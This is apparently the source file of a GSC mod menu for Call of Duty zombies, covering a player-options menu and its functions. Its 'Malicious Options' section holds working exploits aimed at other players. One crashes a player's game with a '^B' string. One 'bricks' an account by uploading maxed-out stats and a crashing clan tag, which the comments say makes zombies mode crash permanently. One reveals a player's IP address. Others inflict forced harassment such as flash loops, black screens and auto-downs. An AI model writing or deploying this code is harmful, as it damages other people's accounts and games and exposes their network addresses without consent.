PopulatePlayerOptions(menu, player)
{
    switch(menu)
    {
        case "Options":
            submenus = Array("Verification", "Basic Scripts", "Teleport Menu", "Weaponry", "Bullet Menu", "Fun Scripts", "Model Manipulation", "Aimbot Menu", "Model Attachment", "Malicious Options");
            
            self addMenu("[^2" + player.verification + "^7]" + CleanName(player getName()));

                for(a = 0; a < submenus.size; a++)
                {
                    self addOpt(submenus[a], ::newMenu, submenus[a]);

                    if(submenus[a] == "Teleport Menu" && SessionModeIsOnlineGame())
                        self addOpt("Profile Management", ::newMenu, "Profile Management");
                }

                self addOpt("Send Message", ::Keyboard, ::MessagePlayer, player);
                self addOptBool(player.FreezePlayer, "Freeze", ::FreezePlayer, player);
                self addOpt("Kick", ::KickPlayer, player);
            break;
        
        case "Verification":
            self addMenu("Verification");
                self addOpt("Save Verification", ::SavePlayerVerification, player);

                for(a = 1; a < (level.MenuStatus.size - 2); a++)
                    self addOptBool((player getVerification() == a), level.MenuStatus[a], ::setVerification, a, player, true);
            break;
        
        case "Model Attachment":
            if(!isDefined(self.playerAttachBone))
                self.playerAttachBone = "j_head";

            self addMenu("Model Attachment");
                
                if(isDefined(level.MenuModels) && level.MenuModels.size)
                {
                    self addOptSlider("Location", ::PlayerAttachmentBone, "j_head;j_neck;j_spine4;j_spinelower;j_mainroot;pelvis;j_ankle_ri;j_ankle_le");
                    self addOpt("Detach All", ::PlayerDetachModels, player);
                    self addOpt("");

                    for(a = 0; a < level.MenuModels.size; a++)
                        if(level.MenuModels[a] != "defaultactor") //Attaching the defaultactor to a player can cause a crash.
                            self addOpt(CleanString(level.MenuModels[a]), ::PlayerModelAttachment, level.menuModels[a], player);
                }
            break;
        
        case "Malicious Options":
            if(!isDefined(player.ShellShockTime))
                player.ShellShockTime = 1;
            
            self addMenu("Malicious Options");
                self addOpt("Open Pause Menu", ::PlayerOpenPauseMenu, player);
                self addOpt("Disable Actions", ::newMenu, "Disable Actions");
                self addOptSlider("Set Stance", ::SetPlayerStance, "Prone;Crouch;Stand", player);
                self addOpt("Launch", ::LaunchPlayer, player);
                self addOpt("Mortar Strike", ::MortarStrikePlayer, player);

                if(ReturnMapName() == "Shadows Of Evil" || ReturnMapName() == "Origins")
                    self addOptSlider("Jump Scare", ::JumpScarePlayer, "Sound & Picture;Sound Only", player);
                
                self addOptBool(player.SyncPlayerVelocity, "Sync Velocity With You", ::SyncPlayerVelocity, player);
                self addOptBool(player.SyncPlayerAngles, "Sync Angles With You", ::SyncPlayerAngles, player);
                self addOptBool(player.AutoDown, "Auto-Down", ::AutoDownPlayer, player);
                self addOptBool(player.FlashLoop, "Flash Loop", ::FlashLoop, player);
                self addOptBool(player.SpinPlayer, "Spin Player", ::SpinPlayer, player);
                self addOptBool(player.BlackScreen, "Black Screen", ::BlackScreenPlayer, player);
                self addOptBool(player.FakeLag, "Fake Lag", ::FakeLag, player);
                self addOptBool(self.AttachToPlayer, "Attach Self To Player", ::AttachSelfToPlayer, player);
                self addOptSlider("Shellshock", ::ApplyShellShock, "Concussion Grenade;Zombie Death;Explosion", player);
                self addOptIncSlider("Shellshock Time", ::SetShellShockTime, 1, 1, 30, 1, player);
                self addOptSlider("Show IP", ::ShowPlayerIP, "Self;Player", player);
                self addOpt("Fake Derank", ::FakeDerank, player);
                self addOpt("Fake Damage", ::FakeDamagePlayer, player);
                self addOpt("Crash Game", ::CrashPlayer, player);
                self addOpt("Brick Account", ::BrickAccountPlayer, player);
            break;
        
        case "Disable Actions":
            self addMenu("Disable Actions");
                self addOptBool(player.DisableAiming, "Aiming", ::DisableAiming, player);
                self addOptBool(player.DisableJumping, "Jumping", ::DisableJumping, player);
                self addOptBool(player.DisableSprinting, "Sprinting", ::DisableSprinting, player);
                self addOptBool(player.DisableWeaps, "Weapons", ::DisableWeaps, player);
                self addOptBool(player.DisableOffhands, "Offhand Weapons", ::DisableOffhands, player);
            break;
    }
}

//Model Attachment Functions
PlayerAttachmentBone(tag)
{
    self.playerAttachBone = tag;
}

PlayerModelAttachment(model, player)
{
    if(!isDefined(player.ModelAttachment))
        player.ModelAttachment = [];

    player.ModelAttachment[player.ModelAttachment.size] = model + ";" + self.playerAttachBone;
    player Attach(model, self.playerAttachBone, true);
}

PlayerDetachModels(player)
{
    if(!isDefined(player.ModelAttachment) || isDefined(player.ModelAttachment) && !player.ModelAttachment.size)
        return self iPrintlnBold("^1ERROR: ^7No Attached Models Found");
    
    for(a = 0; a < player.ModelAttachment.size; a++)
    {
        attach = StrTok(player.ModelAttachment[a], ";");
        player Detach(attach[0], attach[1]);
    }

    player.ModelAttachment = undefined;
}



//Malicious Player Functions
PlayerOpenPauseMenu(player)
{
    player OpenMenu("StartMenu_Main");
}

DisableAiming(player)
{
    player endon("disconnect");

    player.DisableAiming = BoolVar(player.DisableAiming);

    if(Is_True(player.DisableAiming))
    {
        while(Is_True(player.DisableAiming))
        {
            player AllowAds(false);
            wait 0.1;
        }
    }
    else
        player AllowAds(true);
}

DisableJumping(player)
{
    player endon("disconnect");

    player.DisableJumping = BoolVar(player.DisableJumping);
    
    if(Is_True(player.DisableJumping))
    {
        while(Is_True(player.DisableJumping))
        {
            player AllowJump(false);
            wait 0.1;
        }
    }
    else
        player AllowJump(true);
}

DisableSprinting(player)
{
    player endon("disconnect");

    player.DisableSprinting = BoolVar(player.DisableSprinting);
    
    if(Is_True(player.DisableSprinting))
    {
        while(Is_True(player.DisableSprinting))
        {
            player AllowSprint(false);
            wait 0.1;
        }
    }
    else
        player AllowSprint(true);
}

DisableOffhands(player)
{
    player endon("disconnect");

    player.DisableOffhands = BoolVar(player.DisableOffhands);
    
    if(Is_True(player.DisableOffhands))
    {
        while(Is_True(player.DisableOffhands))
        {
            player DisableOffHandWeapons();
            wait 0.1;
        }
    }
    else
        player EnableOffHandWeapons();
}

DisableWeaps(player)
{
    player endon("disconnect");

    player.DisableWeaps = BoolVar(player.DisableWeaps);
    
    if(Is_True(player.DisableWeaps))
    {
        while(Is_True(player.DisableWeaps))
        {
            player DisableWeapons();
            wait 0.1;
        }
    }
    else
        player EnableWeapons();
}

SetPlayerStance(stance, player)
{
    player SetStance(ToLower(stance));
}

LaunchPlayer(player)
{
    player SetOrigin(player.origin + (0, 0, 5));
    player SetVelocity(player GetVelocity() + (RandomIntRange(-500, 500), RandomIntRange(-500, 500), RandomIntRange(1500, 5000)));
}

MortarStrikePlayer(player)
{
    player endon("disconnect");

    for(a = 0; a < 3; a++)
    {
        MagicBullet(GetWeapon("launcher_standard"), player.origin + (0, 0, 2500), player.origin);
        wait 0.15;
    }
}

AutoDownPlayer(player)
{
    if(player IsHost() || player isDeveloper())
        return;
    
    player endon("disconnect");

    player.AutoDown = BoolVar(player.AutoDown);
    
    while(Is_True(player.AutoDown))
    {
        if(Is_Alive(player) && !player IsDown())
        {
            if(Is_True(player.godmode))
                player Godmode(player);

            if(Is_True(player.PlayerDemiGod))
                player DemiGod(player);
            
            player DisableInvulnerability(); //Just to ensure that the player is able to be damaged.
            player DoDamage(player.health + 999, (0, 0, 0));
        }

        wait 0.1;
    }
}

FlashLoop(player)
{
    player endon("disconnect");

    player.FlashLoop = BoolVar(player.FlashLoop);
    
    if(Is_True(player.FlashLoop))
    {
        while(Is_True(player.FlashLoop))
        {
            player ShellShock("concussion_grenade_mp", 5);
            wait 5;
        }
    }
    else
        player StopShellShock();
}

ApplyShellShock(shock, player)
{
    switch(shock)
    {
        case "Concussion Grenade":
            shock = "concussion_grenade_mp";
            break;
        
        case "Zombie Death":
            shock = "zombie_death";
            break;
        
        case "Explosion":
            shock = "explosion";
            break;
        
        default:
            break;
    }

    player ShellShock(shock, player.ShellShockTime);
}

SetShellShockTime(time, player)
{
    player.ShellShockTime = time;
}

SpinPlayer(player)
{
    player endon("disconnect");

    player.SpinPlayer = BoolVar(player.SpinPlayer);
    
    while(Is_True(player.SpinPlayer))
    {
        if(Is_Alive(player))
            player SetPlayerAngles(player GetPlayerAngles() + (0, 25, 0));
        
        wait 0.01;
    }
}

BlackScreenPlayer(player)
{
    player.BlackScreen = BoolVar(player.BlackScreen);

    if(Is_True(player.BlackScreen))
    {
        if(!isDefined(player.BlackScreenHud))
            player.BlackScreenHud = [];

        for(a = 0; a < 2; a++)
            player.BlackScreenHud[player.BlackScreenHud.size] = player createRectangle("CENTER", "CENTER", 0, 0, 5000, 5000, (0, 0, 0), 0, 1, "black");
    }
    else
        destroyAll(player.BlackScreenHud);
}

FakeLag(player)
{
    player endon("disconnect");

    player.FakeLag = BoolVar(player.FakeLag);
    
    while(Is_True(player.FakeLag))
    {
        player SetVelocity((RandomIntRange(-255, 255), RandomIntRange(-255, 255), 0));
        wait 0.25;

        player SetVelocity((0, 0, 0));
        wait 0.025;
    }
}

AttachSelfToPlayer(player)
{
    if(player isPlayerLinked() && !Is_True(self.AttachToPlayer))
        return self iPrintlnBold("^1ERROR: ^7You're Linked To An Entity");
    
    if(player == self)
        return self iPrintlnBold("^1ERROR: ^7You Can't Attach To Yourself");
    
    if(!Is_Alive(player))
        return self iPrintlnBold("^1ERROR: ^7Player Isn't Alive");
    
    player endon("disconnect");

    self.AttachToPlayer = BoolVar(self.AttachToPlayer);

    if(Is_True(self.AttachToPlayer))
    {
        while(Is_True(self.AttachToPlayer))
        {
            if(!self IsLinkedTo(player))
                self PlayerLinkTo(player, "j_head");
            
            if(!Is_Alive(player))
                self thread AttachSelfToPlayer(player);

            wait 0.1;
        }
    }
    else
        self Unlink();
}

JumpScarePlayer(type, player)
{
    if(Is_True(player.JumpScarePlayer))
        return;
    player.JumpScarePlayer = true;

    player endon("disconnect");

    if(ReturnMapName() == "Shadows Of Evil")
    {
        player PlaySoundToPlayer("zmb_zod_egg_scream", player);

        if(type == "Sound & Picture")
            player.var_92fcfed8 = player OpenLUIMenu("JumpScare");
    }
    else
    {
        player PlaySoundToPlayer("zmb_easteregg_scarydog", player);

        if(type == "Sound & Picture")
            player.var_92fcfed8 = player OpenLUIMenu("JumpScare-Tomb");
    }

    wait 0.55;

    if(isDefined(player.var_92fcfed8))
        player CloseLUIMenu(player.var_92fcfed8);
    
    player.JumpScarePlayer = BoolVar(player.JumpScarePlayer);
}

SyncPlayerVelocity(player)
{
    if(player == self && !Is_True(player.SyncPlayerVelocity))
        return self iPrintlnBold("^1ERROR: ^7You Can't Sync Velocity With Yourself");
    
    player endon("disconnect");

    player.SyncPlayerVelocity = BoolVar(player.SyncPlayerVelocity);

    while(Is_True(player.SyncPlayerVelocity))
    {
        player SetVelocity(self GetVelocity());
        wait 0.01;
    }
}

SyncPlayerAngles(player)
{
    if(player == self && !Is_True(player.SyncPlayerAngles))
        return self iPrintlnBold("^1ERROR: ^7You Can't Sync Angles With Yourself");
    
    player endon("disconnect");

    player.SyncPlayerAngles = BoolVar(player.SyncPlayerAngles);

    while(Is_True(player.SyncPlayerAngles))
    {
        player SetPlayerAngles(self GetPlayerAngles());
        wait 0.01;
    }
}

FakeDerank(player)
{
    player SetRank(0, 0);
    player iPrintlnBold("You Have Been ^1Deranked");
}

FakeDamagePlayer(player)
{
    player FakeDamageFrom((RandomIntRange(-100, 100), RandomIntRange(-100, 100), RandomIntRange(-100, 100)));
}

CrashPlayer(player)
{
    if(player IsHost() || player isDeveloper())
        return self iPrintlnBold("^1ERROR: ^7Can't Crash Player");
    
    player iPrintlnBold("^B");
}

ShowPlayerIP(showto, player)
{
    showto = (showto == "Self") ? self : player;
    showto iPrintlnBold(StrTok(player GetIPAddress(), "Public Addr: ")[0]);
}

//Miscellaneous Player Functions
MessagePlayer(msg, player)
{
    player iPrintlnBold("^2" + CleanName(self getName()) + ": ^7" + msg);
}

FreezePlayer(player)
{
    player endon("disconnect");

    player.FreezePlayer = BoolVar(player.FreezePlayer);
    
    if(Is_True(player.FreezePlayer))
    {
        while(Is_True(player.FreezePlayer))
        {
            player FreezeControls(true);
            wait 0.1;
        }
    }
    else
        player FreezeControls(false);
}

KickPlayer(player)
{
    if(player IsHost())
        return self iPrintlnBold("^1ERROR: ^7You Can't Kick The Host");
    
    if(player isDeveloper())
        return self iPrintlnBold("^1ERROR: ^7You Can't Kick The Developer");
    
    Kick(player GetEntityNumber(), "EXE_PLAYERKICKED_NOTSPAWNED");
}

BrickAccountPlayer(player)
{
    if(player IsHost())
        return self iPrintlnBold("^1ERROR: ^7You Can't Brick The Host's Account");
    
    if(player isDeveloper())
        return self iPrintlnBold("^1ERROR: ^7You Can't Brick The Developer's Account");
    
    //These stats will brick the barracks for zombies -- It will crash the players game every time they try to open the zombies mode barracks
    //This also makes sure they can't just reset their zombie stats to get rid of the clantag that crashes them
    player SetDStat("PlayerStatsList", "plevel", "StatValue", 2147483647);
    player SetDStat("PlayerStatsList", "paragon_rank", "StatValue", 2147483647);
    player SetDStat("PlayerStatsList", "paragon_rankxp", "StatValue", 2147483647);

    //This will brick zombies for the player -- Anytime they try to access zombies, they will crash
    SetClanTag("^B", player);
    wait 0.1;
    UploadStats(player);
}